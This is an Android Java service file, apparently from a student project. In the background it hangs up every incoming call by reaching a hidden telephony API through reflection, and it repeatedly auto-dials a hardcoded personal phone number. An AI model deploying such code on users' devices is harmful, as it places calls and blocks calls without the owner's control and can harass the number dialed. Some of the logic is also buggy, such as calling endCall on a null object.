package com.project.final_project;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;
import android.os.RemoteException;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;


import com.android.internal.telephony.ITelephony;

import java.lang.reflect.Method;

public class listenerService extends Service {
    public listenerService() {
    }

    //接收短信广播
    IntentFilter filter_Phone = new IntentFilter("android.intent.action.PHONE_STATE");
    //创建来电广播接收器
    inComingReceiver iReceiver_Phone = new inComingReceiver();
    @Override
    public IBinder onBind(Intent arg0)
    {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate()
    {
        // TODO Auto-generated method stub

        Log.i("Information : ", "開啟打電話功能");
/*
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setData(Uri.parse("tel:0932614079"));
        startActivity(intent);
        */
        TelephonyManager manager = (TelephonyManager)this.getSystemService(TELEPHONY_SERVICE);
        manager.listen(phoneStateListener,phoneStateListener.LISTEN_CALL_STATE);

        super.onCreate();
    }

    private static ITelephony getITelephony(Context context) {
        TelephonyManager mTelephonyManager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        Class c = TelephonyManager.class;
        Method getITelephonyMethod = null;
        try {
            getITelephonyMethod = c.getDeclaredMethod("getITelephony",
                    (Class[]) null); // 获取声明的方法
            getITelephonyMethod.setAccessible(true);
        } catch (SecurityException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }

        try {
            ITelephony iTelephony = (ITelephony) getITelephonyMethod.invoke(
                    mTelephonyManager, (Object[]) null); // 获取实例
            return iTelephony;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }



    PhoneStateListener phoneStateListener = new PhoneStateListener() {

        int number = 0;
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {

            ITelephony iTelephony = getITelephony(listenerService.this);

            switch (state) {
                case TelephonyManager.CALL_STATE_RINGING:
                    iTelephony = getITelephony(getApplicationContext()); //获取电话接口
                    if (iTelephony != null) {
                        try {
                            iTelephony.endCall(); // 挂断电话

                        } catch (RemoteException e) {

                        }
                    }
                    break;

                case TelephonyManager.CALL_STATE_OFFHOOK:
                    try {
                        Thread.sleep(10000);

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    try
                    {
                        iTelephony.endCall();
                    } catch (RemoteException e) {
                        e.printStackTrace();
                    }

                    break;

                case TelephonyManager.CALL_STATE_IDLE:
                    if(number<=3) {
                        Intent intent = new Intent(Intent.ACTION_CALL);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.setData(Uri.parse("tel:0932614079"));
                        startActivity(intent);
                        number++;
                        Log.i("撥打次數 :",String.valueOf(number));

                        iTelephony = getITelephony(getApplicationContext()); //获取电话接口
                        if (iTelephony == null) {
                            try {
                                iTelephony.endCall(); // 挂断电话

                            } catch (RemoteException e) {

                            }
                        }

                    }
                    break;
                default:
                    break;
            }

        }

    };


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        registerReceiver(iReceiver_Phone, filter_Phone);
        return super.onStartCommand(intent, flags, startId);
    }
    @Override
    public void onDestroy()
    {
        // TODO Auto-generated method stub
        super.onDestroy();
        //注销广播接收器

        unregisterReceiver(iReceiver_Phone);
        System.out.println("service is stop");

    }
}
